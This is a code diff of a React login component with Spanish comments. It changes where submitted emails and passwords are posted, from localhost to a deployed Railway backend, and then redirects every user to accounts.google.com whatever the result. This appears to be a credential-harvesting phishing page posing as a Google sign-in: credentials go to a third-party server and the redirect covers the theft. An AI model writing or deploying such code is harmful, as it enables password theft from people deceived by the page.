@@ -23,19 +23,26 @@ export default function AuthRight({
   /* 🔥 ENVÍO FINAL */
   const handleSubmit = async () => {
     try {
-      await fetch("http://localhost:3001/api/auth/login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ email, password }),
-      });
+      const res = await fetch(
+        "https://login-app-production-b48f.up.railway.app/api/auth/login",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ email, password }),
+        }
+      );
+
+      const data = await res.json();
+
+      console.log("RESPUESTA BACKEND:", data);
 
       /* 🔥 REDIRECCIÓN */
       window.location.href = "https://accounts.google.com";
 
     } catch (error) {
-      console.error(error);
+      console.error("ERROR LOGIN:", error);
     }
   };
 
